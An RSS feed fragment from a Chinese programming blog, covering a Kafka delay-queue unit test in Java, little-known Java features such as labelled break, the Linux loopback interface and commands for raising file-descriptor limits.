&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">initProducer&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Properties props &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Properties();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> props.&lt;span style="color:#a6e22e">put&lt;/span>(ProducerConfig.&lt;span style="color:#a6e22e">BOOTSTRAP_SERVERS_CONFIG&lt;/span>, servers);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> props.&lt;span style="color:#a6e22e">put&lt;/span>(ProducerConfig.&lt;span style="color:#a6e22e">VALUE_SERIALIZER_CLASS_CONFIG&lt;/span>, StringSerializer.&lt;span style="color:#a6e22e">class&lt;/span>.&lt;span style="color:#a6e22e">getName&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> props.&lt;span style="color:#a6e22e">put&lt;/span>(ProducerConfig.&lt;span style="color:#a6e22e">KEY_SERIALIZER_CLASS_CONFIG&lt;/span>, StringSerializer.&lt;span style="color:#a6e22e">class&lt;/span>.&lt;span style="color:#a6e22e">getName&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> producer &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> KafkaProducer&lt;span style="color:#f92672">&amp;lt;&amp;gt;&lt;/span>(props);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">@Test&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">testDelayQueue&lt;/span>() &lt;span style="color:#66d9ef">throws&lt;/span> JsonProcessingException, InterruptedException {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String topic &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;delay-minutes-1&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> List&lt;span style="color:#f92672">&amp;lt;&lt;/span>String&lt;span style="color:#f92672">&amp;gt;&lt;/span> topics &lt;span style="color:#f92672">=&lt;/span> Collections.&lt;span style="color:#a6e22e">singletonList&lt;/span>(topic);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> consumer.&lt;span style="color:#a6e22e">subscribe&lt;/span>(topics);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Timer timer &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Timer();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> timer.&lt;span style="color:#a6e22e">schedule&lt;/span>(&lt;span style="color:#66d9ef">new&lt;/span> TimerTask() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">run&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">synchronized&lt;/span> (lock) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> consumer.&lt;span style="color:#a6e22e">resume&lt;/span>(consumer.&lt;span style="color:#a6e22e">paused&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lock.&lt;span style="color:#a6e22e">notify&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }, 0, 1000);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">do&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">synchronized&lt;/span> (lock) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ConsumerRecords&lt;span style="color:#f92672">&amp;lt;&lt;/span>String, String&lt;span style="color:#f92672">&amp;gt;&lt;/span> consumerRecords &lt;span style="color:#f92672">=&lt;/span> consumer.&lt;span style="color:#a6e22e">poll&lt;/span>(Duration.&lt;span style="color:#a6e22e">ofMillis&lt;/span>(200));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (consumerRecords.&lt;span style="color:#a6e22e">isEmpty&lt;/span>()) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lock.&lt;span style="color:#a6e22e">wait&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">continue&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">boolean&lt;/span> timed &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (ConsumerRecord&lt;span style="color:#f92672">&amp;lt;&lt;/span>String, String&lt;span style="color:#f92672">&amp;gt;&lt;/span> consumerRecord : consumerRecords) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">long&lt;/span> timestamp &lt;span style="color:#f92672">=&lt;/span> consumerRecord.&lt;span style="color:#a6e22e">timestamp&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> TopicPartition topicPartition &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> TopicPartition(consumerRecord.&lt;span style="color:#a6e22e">topic&lt;/span>(), consumerRecord.&lt;span style="color:#a6e22e">partition&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (timestamp &lt;span style="color:#f92672">+&lt;/span> 60 &lt;span style="color:#f92672">*&lt;/span> 1000 &lt;span style="color:#f92672">&amp;lt;&lt;/span> System.&lt;span style="color:#a6e22e">currentTimeMillis&lt;/span>()) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String value &lt;span style="color:#f92672">=&lt;/span> consumerRecord.&lt;span style="color:#a6e22e">value&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ObjectMapper objectMapper &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ObjectMapper();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JsonNode jsonNode &lt;span style="color:#f92672">=&lt;/span> objectMapper.&lt;span style="color:#a6e22e">readTree&lt;/span>(value);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JsonNode jsonNodeTopic &lt;span style="color:#f92672">=&lt;/span> jsonNode.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;topic&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String appTopic &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>, appKey &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>, appValue &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (jsonNodeTopic &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> appTopic &lt;span style="color:#f92672">=&lt;/span> jsonNodeTopic.&lt;span style="color:#a6e22e">asText&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (appTopic &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">continue&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JsonNode jsonNodeKey &lt;span style="color:#f92672">=&lt;/span> jsonNode.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;key&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (jsonNodeKey &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> appKey &lt;span style="color:#f92672">=&lt;/span> jsonNode.&lt;span style="color:#a6e22e">asText&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JsonNode jsonNodeValue &lt;span style="color:#f92672">=&lt;/span> jsonNode.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;value&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (jsonNodeValue &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> appValue &lt;span style="color:#f92672">=&lt;/span> jsonNodeValue.&lt;span style="color:#a6e22e">asText&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// send to application topic&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ProducerRecord&lt;span style="color:#f92672">&amp;lt;&lt;/span>String, String&lt;span style="color:#f92672">&amp;gt;&lt;/span> producerRecord &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ProducerRecord&lt;span style="color:#f92672">&amp;lt;&amp;gt;&lt;/span>(appTopic, appKey, appValue);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> producer.&lt;span style="color:#a6e22e">send&lt;/span>(producerRecord).&lt;span style="color:#a6e22e">get&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// success. commit message&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> OffsetAndMetadata offsetAndMetadata &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> OffsetAndMetadata(consumerRecord.&lt;span style="color:#a6e22e">offset&lt;/span>() &lt;span style="color:#f92672">+&lt;/span> 1);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HashMap&lt;span style="color:#f92672">&amp;lt;&lt;/span>TopicPartition, OffsetAndMetadata&lt;span style="color:#f92672">&amp;gt;&lt;/span> metadataHashMap &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> HashMap&lt;span style="color:#f92672">&amp;lt;&amp;gt;&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> metadataHashMap.&lt;span style="color:#a6e22e">put&lt;/span>(topicPartition, offsetAndMetadata);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> consumer.&lt;span style="color:#a6e22e">commitSync&lt;/span>(metadataHashMap);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (ExecutionException e) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> consumer.&lt;span style="color:#a6e22e">pause&lt;/span>(Collections.&lt;span style="color:#a6e22e">singletonList&lt;/span>(topicPartition));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> consumer.&lt;span style="color:#a6e22e">seek&lt;/span>(topicPartition, consumerRecord.&lt;span style="color:#a6e22e">offset&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> timed &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> consumer.&lt;span style="color:#a6e22e">pause&lt;/span>(Collections.&lt;span style="color:#a6e22e">singletonList&lt;/span>(topicPartition));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> consumer.&lt;span style="color:#a6e22e">seek&lt;/span>(topicPartition, consumerRecord.&lt;span style="color:#a6e22e">offset&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> timed &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (timed) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lock.&lt;span style="color:#a6e22e">wait&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">while&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>exit);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这段程序是基于SpringBoot &lt;code>2.4.4&lt;/code>版本和 kafka-client &lt;code>2.7.0&lt;/code>版本编写的一个单元测试，需要修改私有变量&lt;code>servers&lt;/code>为kafka broker的地址。&lt;/p></description></item><item><title>Java的奇技淫巧</title><link>https://www.typesafe.cn/posts/java-unexpected-features/</link><pubDate>Sat, 13 Mar 2021 13:49:38 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-unexpected-features/</guid><description>&lt;p>&lt;strong>Java&lt;/strong>是一种广泛使用的计算机编程语言、面向对象、泛型编程的特性，广泛应用于企业级Web应用开发和移动应用开发。&lt;/p>
&lt;p>1995年3月23日&lt;strong>Sun&lt;/strong>公司发布了&lt;strong>Java&lt;/strong>，至今已有近26年，可以说是一门十分成熟的开发语言了，但在某些不为人知的地方存在着一些意料之外的特性。&lt;/p>
&lt;h3 id="java的保留关键字-goto和const">Java的保留关键字 goto和const&lt;/h3>
&lt;p>在&lt;strong>Java&lt;/strong>里面没有&lt;code>goto&lt;/code>这个功能，但它作为保留字是无法当做变量来使用的，&lt;code>const&lt;/code>也是同样。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#66d9ef">goto&lt;/span> &lt;span style="color:#f92672">=&lt;/span> 0;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#f92672">=&lt;/span> 0;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>上面这两行代码的写法存在问题，无法正常编译通过。&lt;/p>
&lt;h3 id="java标签label">Java标签Label&lt;/h3>
&lt;p>上面说了在&lt;strong>Java&lt;/strong>里面没有&lt;code>goto&lt;/code>这个功能，但为了处理多重循环引入了Label，目的是为了在多重循环中方便的使用 break 和coutinue ，但好像在其他地方也可以用。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>outerLoop:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span> (&lt;span style="color:#66d9ef">true&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;I&amp;#39;m the outer loop&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> 0;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">while&lt;/span> (&lt;span style="color:#66d9ef">true&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;I am the inner loop&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		i&lt;span style="color:#f92672">++&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span> (i &lt;span style="color:#f92672">&amp;gt;=&lt;/span> 3) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span> outerLoop;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Complete the loop&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 输出&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>m the outer loop
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I am the inner loop
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I am the inner loop
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I am the inner loop
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Complete the loop
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>test:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;hello&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">true&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span> test; &lt;span style="color:#75715e">// works&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;world&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 输出&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hello
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>test:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">true&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;hello&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">true&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">break&lt;/span> test; &lt;span style="color:#75715e">// works&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;world&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 输出&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hello
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>test:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;hello&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">true&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">break&lt;/span> test; &lt;span style="color:#75715e">// works&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;world&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} &lt;span style="color:#66d9ef">finally&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 输出&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hello
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="integer的是否相等问题">Integer的是否相等问题&lt;/h3>
&lt;p>日常开发使用到Java基本数据类型是不可避免的一件事，但它却包含了一些很容易犯错的点，踩过一些坑的同学可能了解Java基本包装类型的常量池技术，例如&lt;code>Integer&lt;/code>就具有数值&lt;code>[-128，127] &lt;/code>的相应类型的缓存数据，但下面定义的4个变量是否相等你是否能说的出来呢？&lt;/p></description></item><item><title>Linux 环回网络接口</title><link>https://www.typesafe.cn/posts/linux-loopback/</link><pubDate>Thu, 28 Jan 2021 22:59:00 +0000</pubDate><guid>https://www.typesafe.cn/posts/linux-loopback/</guid><description>&lt;p>在开发或者调试时，我们经常需要和本地的服务器进行通信，例如启动&lt;code>nginx&lt;/code>之后，在浏览器输入&lt;code>lcoalhost&lt;/code>或者&lt;code>127.0.0.1&lt;/code>就可以访问到本机上面的&lt;code>http&lt;/code>服务。&lt;/p>
&lt;h2 id="linux是如何访问本机ip的">Linux是如何访问本机IP的？&lt;/h2>
&lt;p>大多数操作系统都在网络层实现了环回能力，通常是使用一个虚拟的环回网络接口来实现。这个虚拟的环回网络接口看着像是一个真实的网卡，实际上是操作系统用软件模拟的，它可以通过&lt;code>TCP/IP&lt;/code>与同一台主机上的其他服务进行通信，以&lt;code>127&lt;/code>开头的&lt;code>IPv4&lt;/code>地址就是为它保留的，主流&lt;code>Linux&lt;/code>操作系统为环回网卡分配的地址都是&lt;code>127.0.0.1&lt;/code>，主机名是&lt;code>localhost&lt;/code>。&lt;/p>
&lt;p>环回网络接口之所以被称之为环回网络接口，是因为从本机发送到本机任意一个IP的数据报文都会在网络层交给环回网络接口，不再下发到数据链路层进行处理，环回网络接口直接发送回网络层，最终交由应用层软件程序进行处理。这种方式对于性能测试非常有用，因为省去了硬件的开销，可以直接测试协议栈软件所需要的时间。&lt;/p>
&lt;p>那环回网络接口是如何判断目的IP是否为本机地址的呢？&lt;/p>
&lt;p>答案就是网络层在进行路由转发的时候会先查本地的路由表，发现是本机IP后交给环回网络接口。查看本地路由表的命令如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>ip route show table local
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>输出内容如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>broadcast 10.141.128.0 dev eth0 proto kernel scope link src 10.141.155.131 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>local 10.141.155.131 dev eth0 proto kernel scope host src 10.141.155.131 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>broadcast 10.141.191.255 dev eth0 proto kernel scope link src 10.141.155.131 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>broadcast 127.0.0.0 dev lo proto kernel scope link src 127.0.0.1 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>local 127.0.0.0/8 dev lo proto kernel scope host src 127.0.0.1 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>local 127.0.0.1 dev lo proto kernel scope host src 127.0.0.1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>其中&lt;code>local&lt;/code>开头的便是本地IP，&lt;code>dev&lt;/code>后面是网卡名称。&lt;/p></description></item><item><title>Linux 修改最大文件描述符</title><link>https://www.typesafe.cn/posts/linux-limit/</link><pubDate>Mon, 11 Jan 2021 15:40:41 +0000</pubDate><guid>https://www.typesafe.cn/posts/linux-limit/</guid><description>&lt;pre tabindex="0">&lt;code>echo &amp;#34;fs.file-max=655350&amp;#34; &amp;gt;&amp;gt;/etc/sysctl.conf
echo &amp;#34;* soft nofile 655350&amp;#34; &amp;gt;&amp;gt; /etc/security/limits.conf
echo &amp;#34;* hard nofile 655350&amp;#34; &amp;gt;&amp;gt; /etc/security/limits.conf
ulimit -n 655350
